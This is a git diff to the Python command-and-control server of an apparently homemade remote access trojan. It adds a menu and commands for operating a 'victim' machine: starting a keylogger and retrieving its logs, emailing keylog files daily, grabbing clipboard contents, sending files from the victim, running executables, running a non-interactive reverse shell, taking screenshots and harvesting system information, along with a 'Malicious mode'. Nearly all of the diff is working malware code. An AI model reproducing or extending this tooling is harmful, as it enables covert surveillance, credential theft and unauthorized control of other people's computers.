@@ -58,8 +58,66 @@ class Server:
             "-ss": self.screenshot,
             "-vid": self.vidByFrames,
             "-shell": self.cmdctrl,
-            "-email": self.email
+            "-email": self.email,
+            "-dailymail": self.startEmailthread,
+            "-endmailer": self.stopEmailThread,
+            "-clear":self.clear,
+            "-drop": self.closeConnection,
+            "-disc": self.disconnectTarget,
+            "-menu": self.mainmenu
         }
+
+    def mainmenu(self):
+
+        Switcher = {
+            "-msgbox": "Send a custom Alert Messagebox",
+            "-msg": "\tSend a console message",
+            "-shutdown": "Shutdown the target device",
+            "-shutdownM": "Shutdown the target device, with a custom message",
+            "-lock": "\tLock the target Device",
+            "-restart": "Restart the target system",
+            "-EpIV": "\tConnect to a telnet server which plays an ASCII Animation of Star Wars EpIV: A New Hope",
+            "-chess": "Connect to a telnet server allowing the victim to play chess",
+            "-weather": "Opens a telnet based weather forecasting service",
+            "-telnet": "Enables Telnet on the targets device - providing they have permissions",
+            "-KLstart": "Start the keylogger",
+            # "-KLend": "Stop the Keylogger",
+            "-getLogs": "Retrieve the keylogs",
+            "-getcb": "Retrieve the clipboard contents and save to file",
+            "-Fsend": "Send a file from the Victim to this device",
+            "-Frecv": "Send a file from this device to the victim",
+            "-ginfo": "Obtain as much information from the victim as possible",
+            "-exe": "\tRun an Executable file or Script",
+            "-ss": "\tTake a screenshot of the target device",
+            "-vid": "\tTake a series of screenshots which can be used to make a video",
+            "-shell": "Non interactive Reverse Shell - Enter CMD Commands to be executed on the target device",
+            "-email": "Email contents of a chosen file",
+            "-dailymail": "Start a thread to Email the keylog files at a given time everyday",
+            "-endmailer": "Stop the email schedule thread",
+            "-drop": "\tDrop the connection",
+            #"-disc": "\tDisconnect session, keep client alive ",
+            "-clear": "Clear Console",
+            "-Menu": "\tPrint this menu again"
+        }
+        print("\nCommand: \t\t Description:\n")
+        for k, v in Switcher.items():
+            print(k + ": \t\t" + v)
+        print("\n")
+
+    def startEmailthread(self):
+        command = "-dailymail"
+        self.client_socket.send(command.encode())
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        print(response)
+
+    def stopEmailThread(self):
+        command = "-endmailer"
+        self.client_socket.send(command.encode())
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        print(response)
+
+    def clear(self):
+        os.system("cls")
 
     def startServer(self):
         self.server.bind((self.IP, self.PORT))
@@ -78,10 +136,10 @@ class Server:
         mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
         print(mode)
         if mode == "2":
-            print("Virtuous mode")
+            print("[-] Virtuous mode")
             self.connectionconfirm()
         else:
-            print("Malicious mode")
+            print("[-] Malicious mode")
         self.commands()
         # # print("hello worlds")
 
@@ -94,24 +152,31 @@ class Server:
 
     def connectionconfirm(self):
         key = self.generatekey()
-        print("Key =  " + key)
+        print("[##] Key =  " + key)
 
         self.client_socket.send(key.encode("utf-8"))
 
         response = self.client_socket.recv(self.BUFFER_SIZE).decode()
-        if response == "MISMATCH":
+        if response == "[#] KEY MISMATCH":
             self.closeConnection()
 
     def closeConnection(self):
+        self.client_socket.send("-drop".encode())
         self.connections.remove(self.client_socket)
         self.client_socket.close()
         self.server.close()
+        sys.exit()
 
     def disconnectTarget(self):
-        command = "--esc"
-
-        self.client_socket.send(command.encode("utf-8"))
-        print("*** Killed")
+        self.client_socket.send("-disc".encode())
+        self.connections.remove(self.client_socket)
+        self.client_socket.close()
+        sys.exit()
+        # self.client_socket.send("-disc".encode())
+        # self.connections.remove(self.client_socket)
+        # self.client_socket.close()
+        # self.server.close()
+        # print("*** Killed")
 
     # try to update the buffer with recv sized
     def updateBuffer(self, size):
@@ -372,32 +437,6 @@ class Server:
 
                 print("*** File saved ***")
                 self.recvcounter += 1
-                # recv size
-                size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
-                time.sleep(0.1)
-                if int(size) <= self.BUFFER_SIZE:
-                    # recv archive
-                    archive = self.client_socket.recv(self.BUFFER_SIZE)
-                    print("*** Got file ***")
-
-                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
-                        output.write(archive)
-
-                    print("*** File saved ***")
-                    self.recvcounter += 1
-                else:
-                    # update buffer
-                    buff = self.updateBuffer(size)
-
-                    # recv archive
-                    fullarchive = self.saveBigFile(int(size), buff)
-
-                    print("*** Got file *** ")
-                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
-                        output.write(fullarchive)
-
-                    print("*** File saved ***")
-                    self.recvcounter += 1
         else:
             print(response.decode("utf-8"))
 
@@ -481,7 +520,7 @@ class Server:
         return info
 
     def exePy(self):
-        command ="-exePy"
+        command ="-exe"
         self.client_socket.send(command.encode())
         filename = input("[+] Enter the full filepath: ")
         self.client_socket.send(filename.encode())
@@ -521,6 +560,7 @@ class Server:
 
 # ''' MAIN BULK '''
     def commands(self):
+            self.mainmenu()
             # os.system("clear")
             while True:
              # get the command from prompt
